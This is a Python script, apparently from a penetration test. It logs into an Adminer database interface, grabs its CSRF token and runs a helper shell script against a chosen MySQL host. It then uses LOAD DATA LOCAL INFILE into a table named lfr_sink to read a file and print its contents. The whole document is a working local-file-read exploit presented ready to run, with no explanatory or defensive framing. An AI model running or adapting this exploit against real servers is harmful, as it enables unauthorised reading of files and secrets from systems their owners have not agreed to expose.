import requests
import urllib
import sys
import re
from bs4 import BeautifulSoup
import subprocess
import shlex



print("Script started")

def get_headers(url):
    response = requests.head(url)
    try:
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
        return response.headers
    except requests.exceptions.RequestException as e:
        print("Error: ", e)


def execute_sql(sql_query, adminer_url, mysql_server, username, db_name, session, preview_rows=None):
    encoded_sql = urllib.parse.quote(sql_query)
    url = f"{adminer_url}?server={mysql_server}&username={username}&db={db_name}&sql={encoded_sql}"
    resp = session.get(url)
    html = resp.text

    m = re.search(r'name=["\']token["\']\s*value=["\']([^"\']+)["\']', html, re.IGNORECASE)
    token = m.group(1) if m else None
    if not token:
        soup = BeautifulSoup(html, "lxml")
        inp = soup.find("input", attrs={"name":"token"}) or soup.find("input", attrs={"name":"auth[token]"})
        if inp and inp.get("value"):
            token = inp.get("value")
    if not token:
        open("debug_adminer_page.html","w",encoding="utf-8").write(html)
        print("CSRF token not found (saved debug_adminer_page.html)")
        return None

    post_resp = session.post(
        adminer_url + f"?server={mysql_server}&username={username}&db={db_name}&sql={encoded_sql}",
        data={"query": sql_query, "limit": "", "token": token, "db": db_name}
    )
    post_html = post_resp.text

    soup = BeautifulSoup(post_html, "lxml")
    tables = soup.find_all('table', attrs={'class':'nowrap','cellspacing':'0'}) or \
             soup.find_all('table', attrs={'class':'nowrap'}) or \
             soup.find_all('table')

    if not tables:
        err = soup.find('p', attrs={'class':'error'}) or soup.find('p', attrs={'class':'message'})
        if err:
            return f"Server message: {err.get_text(strip=True)}"
        open("debug_response.html","w",encoding="utf-8").write(post_html)
        return post_html

    table = tables[0]
    headers = [th.get_text(strip=True) for th in table.find_all('th')]
    rows = []
    for tr in table.find_all('tr'):
        tds = tr.find_all('td')
        if not tds:
            continue
        rows.append([td.get_text(strip=True) for td in tds])

    out_lines = []
    out_lines.append(f"{len(rows)} rows")
    if headers:
        out_lines.append(" | ".join(headers))
        out_lines.append("-" * 80)

    if preview_rows is None:
        limit = len(rows)
    else:
        limit = preview_rows

    for r in rows[:limit]:
        out_lines.append(" | ".join(r))

    if preview_rows is not None and len(rows) > preview_rows:
        out_lines.append(f"... and {len(rows)-preview_rows} more rows (showing first {preview_rows})")

    return "\n".join(out_lines)


def run_setup_script(script_path, target_ip, target_port):

    try:
        result = subprocess.run(
            [script_path, target_ip, str(target_port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True, 
            check=True
        )
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print("Script stderr:", result.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Setup script failed with return code {e.returncode}")
        print("stdout:", e.stdout)
        print("stderr:", e.stderr)
        raise


def main():
    print("Main function started")
    
    if len(sys.argv) == 6:
        adminer_url = sys.argv[1]
        mysql_server = sys.argv[2]
        username = sys.argv[3]
        password = sys.argv[4]
        db_name = sys.argv[5]
        print(f"Args: {adminer_url}, {mysql_server}, {username}, {db_name}")
    else:
        print("Need 5 arguments: URL, MySQL server, username, password, DB name")
        print(f"Got {len(sys.argv)-1} args")
        return

    setup_script = "script.sh"
    subprocess.run(["bash", setup_script, *mysql_server.split(":", 1)], check=True)

    session = requests.Session()

    login_data = {
        'auth[driver]': 'server',
        'auth[server]': mysql_server,
        'auth[username]': username,
        'auth[password]': password,
        'auth[db]': db_name
    }

    print("Sending login request...")
    response = session.post(adminer_url, data=login_data)
    print(f"Login response: {response.status_code}")
    if (response.status_code != 200):
        return

    print("Cleaning table...")
    execute_sql("TRUNCATE TABLE lfr_sink", adminer_url, mysql_server, username, db_name, session)

    print("Loading file...")
    execute_sql("LOAD DATA LOCAL INFILE 'C:/Users/ivani/Desktop/Пентест/Solr.txt' INTO TABLE lfr_sink", adminer_url, mysql_server, username, db_name, session)

    print("Reading result...")
    data = execute_sql("SELECT * FROM lfr_sink", adminer_url, mysql_server, username, db_name, session)
    print("RESULT:", data)

if __name__ == "__main__":
    main()
    print("Script finished")
